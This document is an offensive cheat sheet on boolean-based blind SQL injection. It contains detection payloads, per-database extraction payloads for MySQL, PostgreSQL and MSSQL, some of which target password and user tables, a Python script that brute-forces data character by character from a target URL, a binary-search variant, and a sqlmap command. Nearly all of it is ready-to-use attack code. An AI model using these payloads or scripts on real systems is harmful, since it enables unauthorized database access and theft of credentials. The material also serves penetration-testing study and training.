# SQL Injection - Boolean-Based Blind

## Detection
```sql
' AND 1=1-- -   # True (page looks normal)
' AND 1=2-- -   # False (page differs/errors/empty)
```

Compare response length, content, or status code between TRUE and FALSE conditions.

## Extracting Data Character by Character

### Generic Pattern
```sql
' AND SUBSTRING((SELECT version()),1,1)='5'-- -
' AND SUBSTRING((SELECT version()),1,1)>'4'-- -   # Binary search approach
```

### MySQL
```sql
' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'-- -
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77-- -
```

### PostgreSQL
```sql
' AND SUBSTRING((SELECT current_database()),1,1)='p'--
' AND ASCII(SUBSTRING((SELECT usename FROM pg_user LIMIT 1),1,1))>77--
```

### MSSQL
```sql
' AND SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1)='m'--
' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1))>77--
```

## Automated Extraction Script
```python
import requests
import string

url = "https://target.com/page"
charset = string.ascii_letters + string.digits + "_-"
result = ""

for pos in range(1, 50):
    found = False
    for c in charset:
        payload = f"' AND SUBSTRING((SELECT version()),{pos},1)='{c}'-- -"
        r = requests.get(url, params={"id": f"1{payload}"})
        if "Welcome" in r.text:  # TRUE condition indicator
            result += c
            found = True
            break
    if not found:
        break
    print(f"Extracted so far: {result}")

print(f"Final: {result}")
```

## Binary Search Optimization (Faster)
```python
def get_char_binary_search(pos):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"' AND ASCII(SUBSTRING((SELECT version()),{pos},1))>{mid}-- -"
        r = requests.get(url, params={"id": f"1{payload}"})
        if "Welcome" in r.text:
            low = mid + 1
        else:
            high = mid
    return chr(low)
```

## Distinguishing TRUE/FALSE
- Different page content length
- Presence/absence of specific text ("Welcome" vs "Error")
- HTTP status code difference (200 vs 500)
- Response time difference (if combined with heavy query)

## Automated
```bash
sqlmap -u "https://target.com/page?id=1" --technique=B
```
